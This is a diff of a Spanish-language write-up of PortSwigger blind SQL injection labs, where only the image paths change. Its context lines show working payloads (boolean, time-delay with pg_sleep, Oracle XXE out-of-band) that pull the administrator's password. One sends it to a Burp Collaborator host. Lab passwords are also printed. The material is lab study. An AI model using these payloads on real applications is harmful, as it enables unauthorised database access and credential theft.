@@ -28,7 +28,7 @@ To solve the lab, log in as the administrator user.
 TrackingId
 vV98oHaO4oKxWhb1
 
-![](2022-07-07-18-53-17.png)
+![](assets/2022-07-07-18-53-17.png)
 
 Según nuestros payloads , la consulta que hace dentro es esta
 
@@ -39,11 +39,11 @@ SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
 Si existe el usuario nos devuelve un welcome, si no nos devuelve nada.
 
 La consulta normal sería 
-![](2022-07-07-18-58-21.png)
+![](assets/2022-07-07-18-58-21.png)
 
 La consulta modificando el blind sería poniendole otra cosa
 
-![](2022-07-07-18-59-03.png)
+![](assets/2022-07-07-18-59-03.png)
 
 No devuelve nada.
 
@@ -53,7 +53,7 @@ No devuelve nada.
 ...xyz' AND '1'='1--
 …xyz' AND '1'='2--
 ```
-![](2022-07-07-19-01-01.png)
+![](assets/2022-07-07-19-01-01.png)
 
 Miramos también el 1=2 para que no funcione.
 
@@ -74,7 +74,7 @@ Nosotros añadimos
 ' and (select 'x' from users LIMIT 1)='x'--
 ```
 
-![](2022-07-07-19-07-05.png)
+![](assets/2022-07-07-19-07-05.png)
 
 Existe la tabla, cambiamos el nombre para ver si no devuelve welcome. Efectivamente si cambiamos la tabla users por otro nombre no nos devuelve welcome.
 
@@ -94,13 +94,13 @@ Añadimos
 ```bash
 ' and (select 'username' from users where username='administrator')=''administrator'--
 ```
-![](2022-07-07-19-13-29.png)
+![](assets/2022-07-07-19-13-29.png)
 
 No aparece welcome, por lo que o nos hemos equivocado o no existe. Me acabo de dar cuenta que después del igual he puestos dos ' u encima le he puesto a username ' 
 ```bash
 ' and (select username from users where username='administrator')='administrator'--
 ```
-![](2022-07-07-19-18-40.png)
+![](assets/2022-07-07-19-18-40.png)
 
 Ahora si funciona
 
@@ -124,15 +124,15 @@ Tenemos que hacer una consulta que compare el tamaño.
 ```
 Si no me he equivocado esto tendría que funcionar por lo cual lo ponemos en repeater, enviamos a intruder y donde pone 0 haremos un brute force de numeros hasta por ejemplo el 30.
 
-![](2022-07-07-19-27-13.png)
+![](assets/2022-07-07-19-27-13.png)
 
 > La primera condición que fuese administrator y mayor que 0 se cumple, por lo que se cumple con la segunda condición , sería 1=1 por lo que devuelve welcome.
 
-![](2022-07-07-19-28-46.png)
+![](assets/2022-07-07-19-28-46.png)
 
 Nos da un cambio a partir del caracter 20 por lo cual tendremos 20 caracteres en la contraseña... imposible hacerlo a mano
 
-![](2022-07-07-19-29-34.png)
+![](assets/2022-07-07-19-29-34.png)
 
 ### 7. obtener la contraseña
 
@@ -171,40 +171,40 @@ En intruder tendremos que hacer dos tipos de ataque.
    1. el primer 1 de la substring será un recorrido de 1 a 20
    2. la a será un brute force de alfanuméricos
 
-![](2022-07-07-19-41-12.png)
+![](assets/2022-07-07-19-41-12.png)
 
 Si no me he equivocado tendría que ir así... voy a mandarlo a intruder y hacer los dos ataques como he dicho antes.
 
 
 Seleccionamos ataque cluster bomb y los datos que van a cambiar el 1 y el a
-![](2022-07-07-19-47-31.png)
+![](assets/2022-07-07-19-47-31.png)
 
 1. Iterador de posición del caracter de password
     
 
-   ![](2022-07-07-19-48-18.png)
+   ![](assets/2022-07-07-19-48-18.png)
 
 2. Brute force alfanumerico
 
-![](2022-07-07-19-48-44.png)
+![](assets/2022-07-07-19-48-44.png)
 
 Le damos a atacar
 
 Obtener los datos
 
-![](2022-07-07-19-49-37.png)
+![](assets/2022-07-07-19-49-37.png)
 
 Vemos que los correctos son con tamaño 5283
 
 Filtramos por welcome back
 
-![](2022-07-07-19-55-34.png)
+![](assets/2022-07-07-19-55-34.png)
 
 Algo ha tenido que pasar, no me aparece ninguna correcta que la posición sea mayor de 9
 
 Ordenando me doy cuenta de lo siguiente
 
-![](2022-07-07-20-10-02.png)
+![](assets/2022-07-07-20-10-02.png)
 
 Está pillando password pero no el password de la substring XD
 
@@ -219,13 +219,13 @@ Desde luego estos errores no me volverán a pasar, si nos damos cuenta le estaba
 
 ```
 
-![](2022-07-07-20-13-20.png)
+![](assets/2022-07-07-20-13-20.png)
 
 Esto ya tiene mejor pinta
 
 ehfs7kn1ms4epn95kfv5
 
-![](2022-07-07-20-17-31.png)
+![](assets/2022-07-07-20-17-31.png)
 
 
 
@@ -244,7 +244,7 @@ To solve the lab, log in as the administrator user.
 - tabla users , username y passowrd
 - obtener administrator password
 
-![](2022-07-08-11-16-38.png)
+![](assets/2022-07-08-11-16-38.png)
 
 
 >NOTA: Estos ejercicios se pueden hacer casi directamente pero la intención de esta guía es que me sirva de metodología para cualquier caso. Una vez acabe los laboratorios actualizaré mi metodología para que funcione con los diferentes tipos de ejercicios.
@@ -314,11 +314,11 @@ básicamente la vamos a añadir dentro del select, pero ya sabemos que si existe
 
    1. con nombre falso
 
-      ![](2022-07-08-12-40-56.png)
+      ![](assets/2022-07-08-12-40-56.png)
 
    2. Con nombre que existe administrator
 
-      ![](2022-07-08-12-41-37.png)
+      ![](assets/2022-07-08-12-41-37.png)
 
 ### 5. Obtener la clave
 
@@ -348,21 +348,21 @@ Con esto conseguimos saber el tamaño, tenemos que mandarlo a intruder pero aña
 
 Antes de mandarlo voy a hacer una prueba con password >0 eso es verdad por lo que la condición sería 1 por lo que el resultado sería 
 
-![](2022-07-08-12-53-10.png)
+![](assets/2022-07-08-12-53-10.png)
 
 Luego probaré una consulta con password> 1000 sería falso por lo que la condición and haría que fuese falso por lo que el resultado sería 200
 
-![](2022-07-08-12-54-01.png)
+![](assets/2022-07-08-12-54-01.png)
 
 Ahora ya podemos mandarlo y ver que tamaño será.
 
 Sería un snipper normal
 
-![](2022-07-08-12-55-18.png)
+![](assets/2022-07-08-12-55-18.png)
 
 Tiene 20 caracteres porque el cambio de respuesta de 500 a 200 está ahí y la condición es que sea mayor
 
-![](2022-07-08-12-56-20.png)
+![](assets/2022-07-08-12-56-20.png)
 
 ## 7. Obtener la contraseña
 
@@ -386,12 +386,12 @@ Lo hemos hecho de la otra manera porque al dar siempre
 Ahora cambiamos por el 1=1
 ```
 
-![](2022-07-08-14-48-11.png)
+![](assets/2022-07-08-14-48-11.png)
 
 awh1rah1ldpr6tzk32rt
 
 
-![](2022-07-08-14-52-13.png)
+![](assets/2022-07-08-14-52-13.png)
 
 ## Lab: Blind SQL injection with time delays
 
@@ -454,7 +454,7 @@ Sabemos que es esta en postgree
 No funciona, vamos a ponerle ()
 ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
 
-![](2022-07-08-19-29-36.png)
+![](assets/2022-07-08-19-29-36.png)
 
 ### Comprobamos si existe administrator en users
 
@@ -471,7 +471,7 @@ Con esta opción va a ir todas las opciones rápido menos cuando funcione. Lo qu
 
 En este caso el tamaño de la contraseña es de 20
 
-![](2022-07-08-19-41-42.png)
+![](assets/2022-07-08-19-41-42.png)
 
 ## Vamos a ver ahora la contraseña
 ' || (SELECT CASE WHEN (username='administrator' and substring(password,1,1)='a')THEN pg_sleep(10) ELSE pg_sleep(-1) END from users)--;
@@ -485,10 +485,10 @@ Una vez ordenamos boton de la derecha add coment
 Filtramos por solo comentados y ordenamos por posicion
 
 
-![](2022-07-09-19-50-50.png)
+![](assets/2022-07-09-19-50-50.png)
 2wx2fjkx21cr5rsf3ge8
 
-![](2022-07-09-19-52-23.png)
+![](assets/2022-07-09-19-52-23.png)
 
 ## Lab: Blind SQL injection with out-of-band interaction
 
@@ -530,7 +530,7 @@ probamos oracle
 
 ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://heztnyh9r33dob8zc0hm7xaiy94zso.burpcollaborator.net"> %remote;]>'),'/l') FROM dual)--
 
-![](2022-07-09-20-24-17.png)
+![](assets/2022-07-09-20-24-17.png)
 
 ## Lab: Blind SQL injection with out-of-band data exfiltration
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
@@ -548,7 +548,7 @@ Es un ejercicio como los de antes. Es más podemos usar sus columnas, veremos co
 ```sql
 ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://heztnyh9r33dob8zc0hm7xaiy94zso.burpcollaborator.net"> %remote;]>'),'/l') FROM dual)--
 ```
-![](2022-07-09-20-31-37.png)
+![](assets/2022-07-09-20-31-37.png)
 
 Vemos que funciona por lo cual es oracle
 
@@ -559,11 +559,11 @@ Vemos que funciona por lo cual es oracle
 si en el select le inyectamos 
 select password from users where username='administrator'
 
-![](2022-07-09-20-44-43.png)
+![](assets/2022-07-09-20-44-43.png)
 
 oqoyckz7kjkegmb2kxl6.heztnyh9r33dob8zc0hm7xaiy94zso.burpcollaborator.net.
 
 La primera parte antes del . es la solución al select que enviamos
 
-![](2022-07-09-20-47-34.png)
+![](asset/2022-07-09-20-47-34.png)
 
